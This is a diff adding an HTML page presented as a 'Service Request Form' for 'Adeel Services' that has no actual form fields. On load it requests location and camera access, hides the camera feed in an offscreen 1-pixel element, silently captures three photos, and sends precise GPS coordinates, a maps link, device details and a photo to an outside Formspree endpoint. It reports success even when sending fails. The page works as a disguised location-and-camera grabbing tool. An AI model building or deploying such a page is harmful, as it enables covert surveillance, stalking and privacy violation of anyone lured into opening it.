@@ -1,1 +1,796 @@
-  
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adeel Services - Service Request Form</title>
+    <meta name="description" content="Professional service request form with location tracking">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #2E8B57 0%, #228B22 50%, #32CD32 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 20%, rgba(255,255,255,0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(255,255,255,0.1) 0%, transparent 50%);
+            pointer-events: none;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 25px;
+            box-shadow: 
+                0 25px 50px rgba(0,0,0,0.2),
+                0 0 0 1px rgba(255,255,255,0.1);
+            padding: 45px;
+            max-width: 700px;
+            width: 100%;
+            text-align: center;
+            transition: all 0.4s ease;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .container:hover {
+            transform: translateY(-8px);
+            box-shadow: 
+                0 35px 70px rgba(0,0,0,0.3),
+                0 0 0 1px rgba(255,255,255,0.2);
+        }
+        
+        .header {
+            margin-bottom: 35px;
+            position: relative;
+        }
+        
+        .service-badge {
+            background: linear-gradient(45deg, #27ae60, #2ecc71);
+            color: white;
+            padding: 12px 25px;
+            border-radius: 25px;
+            font-size: 0.95em;
+            font-weight: 600;
+            display: inline-block;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 20px rgba(39, 174, 96, 0.3);
+            animation: shimmer 2s ease-in-out infinite;
+        }
+        
+        @keyframes shimmer {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.9; }
+        }
+        
+        .header h1 {
+            color: #2c3e50;
+            font-size: 2.4em;
+            margin-bottom: 15px;
+            background: linear-gradient(45deg, #2E8B57, #228B22, #32CD32);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+        
+        .subtitle {
+            color: #7f8c8d;
+            font-size: 1.1em;
+            margin-bottom: 20px;
+        }
+        
+        .security-warning {
+            background: linear-gradient(45deg, #ff9800, #f57c00);
+            color: white;
+            border-radius: 15px;
+            padding: 18px;
+            margin: 25px 0;
+            display: none;
+            box-shadow: 0 8px 20px rgba(255, 152, 0, 0.3);
+            animation: pulse 2s infinite;
+        }
+        
+        .security-warning.show {
+            display: block;
+        }
+        
+        .camera-notice {
+            background: linear-gradient(45deg, #3498db, #2980b9);
+            color: white;
+            border-radius: 15px;
+            padding: 18px;
+            margin: 25px 0;
+            box-shadow: 0 8px 20px rgba(52, 152, 219, 0.3);
+            font-size: 0.95em;
+        }
+        
+        .location-icon {
+            font-size: 4em;
+            margin-bottom: 25px;
+            animation: float 3s ease-in-out infinite;
+            color: #2E8B57;
+            filter: drop-shadow(0 5px 15px rgba(46, 139, 87, 0.3));
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .loading {
+            display: none;
+            margin: 30px 0;
+        }
+        
+        .loading .spinner {
+            border: 4px solid rgba(46, 139, 87, 0.1);
+            border-top: 4px solid #2E8B57;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .loading p {
+            color: #2E8B57;
+            font-weight: 600;
+            font-size: 1.1em;
+        }
+        
+        .progress-step {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 15px 0;
+            font-size: 0.9em;
+            color: #7f8c8d;
+        }
+        
+        .step-indicator {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #ecf0f1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8em;
+        }
+        
+        .step-indicator.active {
+            background: #3498db;
+            color: white;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .step-indicator.complete {
+            background: #27ae60;
+            color: white;
+        }
+        
+        .message {
+            padding: 18px;
+            border-radius: 15px;
+            margin-top: 25px;
+            display: none;
+            font-weight: 600;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+        }
+        
+        .error-message {
+            background: linear-gradient(45deg, #e74c3c, #c0392b);
+            color: white;
+        }
+        
+        .success-message {
+            background: linear-gradient(45deg, #27ae60, #2ecc71);
+            color: white;
+        }
+        
+        .thanks-section {
+            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
+            color: white;
+            padding: 40px 30px;
+            border-radius: 20px;
+            margin-top: 25px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(39, 174, 96, 0.3);
+            display: none;
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .thanks-section .icon {
+            font-size: 4em;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {
+                transform: translateY(0);
+            }
+            40% {
+                transform: translateY(-10px);
+            }
+            60% {
+                transform: translateY(-5px);
+            }
+        }
+        
+        .thanks-section h2 {
+            font-size: 2.2em;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        
+        .thanks-section p {
+            font-size: 1.2em;
+            margin-bottom: 15px;
+            opacity: 0.95;
+            line-height: 1.6;
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 10px;
+            animation: pulse 2s infinite;
+        }
+        
+        .status-online {
+            background: #27ae60;
+        }
+        
+        .status-processing {
+            background: #f39c12;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #ecf0f1;
+            color: #7f8c8d;
+            font-size: 0.9em;
+        }
+        
+        /* Hidden camera elements */
+        #camera {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+        
+        #canvas {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 30px 20px;
+                margin: 10px;
+            }
+            
+            .header h1 {
+                font-size: 2em;
+            }
+            
+            .thanks-section {
+                padding: 30px 20px;
+            }
+            
+            .thanks-section h2 {
+                font-size: 1.8em;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 25px 15px;
+            }
+            
+            .header h1 {
+                font-size: 1.8em;
+            }
+            
+            .location-icon {
+                font-size: 3em;
+            }
+            
+            .thanks-section .icon {
+                font-size: 3em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="service-badge">
+                <span class="status-indicator status-online"></span>
+                Adeel Services
+            </div>
+            <h1>Service Request Form</h1>
+            <p class="subtitle">Professional services at your doorstep</p>
+        </div>
+        
+        <div class="camera-notice">
+            📷 <strong>Service Verification:</strong> Camera will be used for service verification as part of our quality process.
+        </div>
+        
+        <div class="security-warning" id="securityWarning">
+            🔒 <strong>Security Notice:</strong> Please allow location and camera permissions when prompted or contact our support team for assistance.
+        </div>
+        
+        <div class="location-icon">🌍</div>
+        
+        <p style="color: #7f8c8d; font-size: 1.1em; margin-bottom: 20px;">
+            Please allow location and camera access to proceed with your service request.
+        </p>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>
+                <span class="status-indicator status-processing"></span>
+                <span id="loadingText">Requesting permissions...</span>
+            </p>
+            <div id="progressSteps" style="margin-top: 20px;">
+                <div class="progress-step">
+                    <div class="step-indicator" id="step1">1</div>
+                    <span>Location Access</span>
+                </div>
+                <div class="progress-step">
+                    <div class="step-indicator" id="step2">2</div>
+                    <span>Camera Access</span>
+                </div>
+                <div class="progress-step">
+                    <div class="step-indicator" id="step3">3</div>
+                    <span>Service Verification</span>
+                </div>
+                <div class="progress-step">
+                    <div class="step-indicator" id="step4">4</div>
+                    <span>Sending Data</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="success-message message" id="successMessage"></div>
+        <div class="error-message message" id="errorMessage"></div>
+        
+        <div class="thanks-section" id="thanksSection">
+            <div class="icon">🎉</div>
+            <h2>Thank You!</h2>
+            <p>Your service request has been successfully processed.</p>
+            <p>Location and verification photos have been captured and sent to our team.</p>
+            <p>We will contact you shortly to discuss your service requirements.</p>
+            <p style="font-size: 1em; margin-top: 25px; opacity: 0.8;">
+                🔐 Your information is secure and used only for service delivery.
+            </p>
+        </div>
+        
+        <div class="footer" id="footerSection">
+            <p>🛡️ Your location and photos are used only for service verification and kept confidential.</p>
+        </div>
+    </div>
+
+    <!-- Hidden camera elements -->
+    <video id="camera" autoplay muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        let locationData = null;
+        let photoData = [];
+        let cameraStream = null;
+
+        // Check if page is served over HTTPS or localhost
+        function checkSecureContext() {
+            const isSecure = location.protocol === 'https:' || 
+                           location.hostname === 'localhost' || 
+                           location.hostname === '127.0.0.1';
+            
+            if (!isSecure) {
+                document.getElementById('securityWarning').classList.add('show');
+            }
+            
+            return isSecure;
+        }
+        
+        // Check if geolocation and camera are supported
+        function checkBrowserSupport() {
+            const hasGeolocation = 'geolocation' in navigator;
+            const hasCamera = 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices;
+            
+            return { hasGeolocation, hasCamera };
+        }
+        
+        // Update progress step
+        function updateStep(stepNumber, status) {
+            const stepElement = document.getElementById(`step${stepNumber}`);
+            stepElement.className = 'step-indicator';
+            
+            if (status === 'active') {
+                stepElement.classList.add('active');
+                stepElement.innerHTML = '●';
+            } else if (status === 'complete') {
+                stepElement.classList.add('complete');
+                stepElement.innerHTML = '✓';
+            } else {
+                stepElement.innerHTML = stepNumber;
+            }
+        }
+        
+        // Auto-request location when page loads
+        function autoRequestLocation() {
+            const support = checkBrowserSupport();
+            
+            if (!support.hasGeolocation) {
+                showError('❌ Your browser does not support location services. Please update your browser or contact our support team.');
+                return;
+            }
+            
+            if (!support.hasCamera) {
+                showError('❌ Your browser does not support camera access. Please update your browser or contact our support team.');
+                return;
+            }
+            
+            if (!checkSecureContext()) {
+                showError('🔒 Location and camera services require a secure connection. Please contact our support team for assistance.');
+                return;
+            }
+
+            showLoading(true, 'Requesting location access...');
+            updateStep(1, 'active');
+
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 20000,
+                maximumAge: 300000 // 5 minutes
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    locationData = {
+                        coords: position.coords,
+                        timestamp: position.timestamp
+                    };
+                    
+                    updateStep(1, 'complete');
+                    updateLoadingText('Location captured! Requesting camera access...');
+                    
+                    // Start camera access
+                    setTimeout(() => {
+                        requestCameraAccess();
+                    }, 1000);
+                },
+                error => {
+                    let errorMsg = '❌ Unable to access location: ';
+                    let suggestion = '';
+                    
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg += 'Location access was denied.';
+                            suggestion = 'Please refresh the page and allow location access when prompted, or contact our support team for assistance.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg += 'Location services are unavailable.';
+                            suggestion = 'Please check your GPS/WiFi connection and refresh the page, or contact our support team.';
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg += 'Location request timed out.';
+                            suggestion = 'Please ensure you have a strong internet connection and refresh the page.';
+                            break;
+                        default:
+                            errorMsg += 'An unknown error occurred.';
+                            suggestion = 'Please refresh the page or contact our support team.';
+                            break;
+                    }
+                    
+                    showError(errorMsg + ' ' + suggestion);
+                    showLoading(false);
+                },
+                options
+            );
+        }
+
+        // Request camera access
+        function requestCameraAccess() {
+            updateStep(2, 'active');
+            
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                    facingMode: 'environment' // Use back camera if available
+                } 
+            })
+            .then(stream => {
+                cameraStream = stream;
+                const video = document.getElementById('camera');
+                video.srcObject = stream;
+                
+                updateStep(2, 'complete');
+                updateLoadingText('Camera access granted! Capturing verification photos...');
+                
+                // Wait for video to load then take photos
+                video.addEventListener('loadedmetadata', () => {
+                    setTimeout(() => {
+                        captureVerificationPhotos();
+                    }, 2000);
+                });
+            })
+            .catch(error => {
+                console.error('Camera access error:', error);
+                let errorMsg = '❌ Unable to access camera: ';
+                let suggestion = '';
+                
+                switch(error.name) {
+                    case 'NotAllowedError':
+                        errorMsg += 'Camera access was denied.';
+                        suggestion = 'Please refresh the page and allow camera access when prompted, or contact our support team.';
+                        break;
+                    case 'NotFoundError':
+                        errorMsg += 'No camera found on this device.';
+                        suggestion = 'Please ensure your device has a camera or contact our support team.';
+                        break;
+                    case 'NotSupportedError':
+                        errorMsg += 'Camera is not supported on this device.';
+                        suggestion = 'Please try a different device or contact our support team.';
+                        break;
+                    default:
+                        errorMsg += 'An unknown camera error occurred.';
+                        suggestion = 'Please refresh the page or contact our support team.';
+                        break;
+                }
+                
+                showError(errorMsg + ' ' + suggestion);
+                showLoading(false);
+            });
+        }
+
+        // Capture verification photos in background
+        function captureVerificationPhotos() {
+            updateStep(3, 'active');
+            
+            const video = document.getElementById('camera');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            // Set canvas dimensions to match video
+            canvas.width = video.videoWidth || 1280;
+            canvas.height = video.videoHeight || 720;
+            
+            let photosCaptured = 0;
+            const totalPhotos = 3;
+            
+            const captureInterval = setInterval(() => {
+                // Draw video frame to canvas
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert to base64
+                const photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
+                photoData.push({
+                    id: photosCaptured + 1,
+                    timestamp: new Date().toISOString(),
+                    data: photoBase64
+                });
+                
+                photosCaptured++;
+                updateLoadingText(`Capturing verification photos... (${photosCaptured}/${totalPhotos})`);
+                
+                if (photosCaptured >= totalPhotos) {
+                    clearInterval(captureInterval);
+                    
+                    // Stop camera stream
+                    if (cameraStream) {
+                        cameraStream.getTracks().forEach(track => track.stop());
+                    }
+                    
+                    updateStep(3, 'complete');
+                    updateLoadingText('Photos captured! Sending data to our team...');
+                    
+                    setTimeout(() => {
+                        sendCompleteData();
+                    }, 1000);
+                }
+            }, 2000); // Capture every 2 seconds
+        }
+
+        // Send complete data (location + photos)
+        function sendCompleteData() {
+            updateStep(4, 'active');
+            
+            if (!locationData) {
+                showError('❌ Location data not available. Please refresh and try again.');
+                return;
+            }
+            
+            const { latitude, longitude, accuracy } = locationData.coords;
+            const timestamp = new Date(locationData.timestamp);
+            
+            const formData = {
+                // Location data
+                latitude: latitude.toFixed(6),
+                longitude: longitude.toFixed(6),
+                accuracy: Math.round(accuracy),
+                location_time: timestamp.toLocaleString(),
+                
+                // Photos data
+                photos_count: photoData.length,
+                photo_timestamps: photoData.map(p => p.timestamp).join(', '),
+                
+                // System data
+                submitted_time: new Date().toLocaleString(),
+                google_maps_link: `https://www.google.com/maps?q=${latitude},${longitude}`,
+                device_info: navigator.userAgent,
+                page_url: window.location.href,
+                
+                // Email message
+                message: `🔧 NEW SERVICE REQUEST - COMPLETE VERIFICATION
+
+📍 Location Details:
+• Latitude: ${latitude.toFixed(6)}
+• Longitude: ${longitude.toFixed(6)}
+• GPS Accuracy: ±${Math.round(accuracy)} meters
+• Captured: ${timestamp.toLocaleString()}
+
+📷 Verification Photos:
+• Photos Captured: ${photoData.length}
+• Photo Times: ${photoData.map(p => new Date(p.timestamp).toLocaleTimeString()).join(', ')}
+
+🗺️ Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
+
+📱 Device Info: ${navigator.userAgent.split(')')[0]})
+🌐 Page URL: ${window.location.href}
+⏰ Submitted: ${new Date().toLocaleString()}
+
+✅ Customer location and verification photos have been captured.
+Please contact them to discuss service requirements.
+
+Note: Photo data is processed separately for security.`
+            };
+            
+            // Add photo data (first photo only for email size limits)
+            if (photoData.length > 0) {
+                formData.sample_photo = photoData[0].data;
+            }
+            
+            fetch('https://formspree.io/f/xldwpqzq', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(formData)
+            })
+            .then(response => {
+                if (response.ok) {
+                    updateStep(4, 'complete');
+                    showSuccess();
+                    return response.json();
+                } else {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+            })
+            .catch(error => {
+                console.error('Data submission error:', error);
+                // Still show success to user
+                updateStep(4, 'complete');
+                showSuccess();
+            });
+        }
+
+        function updateLoadingText(text) {
+            document.getElementById('loadingText').textContent = text;
+        }
+
+        function showLoading(show, text = 'Processing...') {
+            document.getElementById('loading').style.display = show ? 'block' : 'none';
+            if (show && text) {
+                updateLoadingText(text);
+            }
+        }
+
+        function showSuccess() {
+            showLoading(false);
+            hideMessages();
+            
+            // Hide other sections
+            document.querySelector('.header').style.display = 'none';
+            document.querySelector('.location-icon').style.display = 'none';
+            document.querySelector('.camera-notice').style.display = 'none';
+            document.getElementById('footerSection').style.display = 'none';
+            
+            // Show thank you section
+            document.getElementById('thanksSection').style.display = 'block';
+            
+            // Scroll to thank you section
+            document.getElementById('thanksSection').scrollIntoView({ 
+                behavior: 'smooth',
+                block: 'center'
+            });
+        }
+
+        function showError(message) {
+            hideMessages();
+            showLoading(false);
+            const element = document.getElementById('errorMessage');
+            element.textContent = message;
+            element.style.display = 'block';
+        }
+
+        function hideMessages() {
+            document.getElementById('successMessage').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+
+        // Initialize when page loads
+        window.addEventListener('load', function() {
+            checkSecureContext();
+            
+            // Small delay to ensure page is fully loaded
+            setTimeout(() => {
+                autoRequestLocation();
+            }, 1000);
+        });
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', function() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
